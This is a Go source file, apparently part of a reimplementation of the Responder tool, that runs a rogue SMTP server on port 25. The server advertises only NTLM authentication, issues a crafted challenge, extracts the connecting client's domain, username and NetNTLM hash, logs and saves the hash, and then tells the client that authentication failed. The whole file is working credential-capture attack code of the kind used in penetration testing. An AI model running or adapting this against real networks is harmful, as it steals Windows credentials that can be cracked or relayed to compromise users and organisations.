package server

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"go-responder/internal/core"
)

func ServeSMTP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:25", ifaceIP))
	if err != nil {
		core.LogError("SMTP listen :25 - %v (need root?)", err)
		return
	}
	core.LogInfo("SMTP listening on %s:25", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandleSMTP(c)
	}
}

func HandleSMTP(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(60 * time.Second))

	challenge := core.GetChallenge()
	w := bufio.NewWriter(c)
	r := bufio.NewReader(c)
	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }

	send("220 " + core.SessionMachineName + " ESMTP")

	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		upper := strings.ToUpper(line)

		switch {
		case strings.HasPrefix(upper, "EHLO") || strings.HasPrefix(upper, "HELO"):
			send("250-" + core.SessionMachineName)
			send("250-AUTH NTLM")
			send("250 AUTH NTLM")

		case upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM "):
			var token string
			if strings.Contains(line, " ") {
				parts := strings.SplitN(line, " ", 3)
				if len(parts) == 3 {
					token = parts[2]
				}
			}
			if token == "" {
				send("334 ")
				token, err = r.ReadString('\n')
				if err != nil {
					return
				}
				token = strings.TrimRight(token, "\r\n")
			}

			raw, err := base64.StdEncoding.DecodeString(token)
			if err != nil {
				send("535 5.7.8 Authentication failed")
				return
			}
			ntlm := core.FindNTLMSSP(raw)
			if len(ntlm) < 12 || core.NTLMMsgType(ntlm) != 1 {
				send("535 5.7.8 Authentication failed")
				return
			}
			core.LogVerbose("SMTP NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
			send("334 " + base64.StdEncoding.EncodeToString(ntlmChallenge))

			type3Line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			type3Line = strings.TrimRight(type3Line, "\r\n")
			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
			ntlm3 := core.FindNTLMSSP(raw3)
			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
				hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
				if err == nil {
					core.LogSuccess("[SMTP] %s captured from %s", ntlmVer, c.RemoteAddr())
					core.LogSuccess("       %s\\%s", domain, user)
					core.LogSuccess("       %s", hash)
					core.SaveHash(hash)
				}
			}
			send("535 5.7.8 Authentication credentials invalid")
			return

		case upper == "QUIT":
			send("221 2.0.0 Bye")
			return

		default:
			send("502 Command not implemented")
		}
	}
}
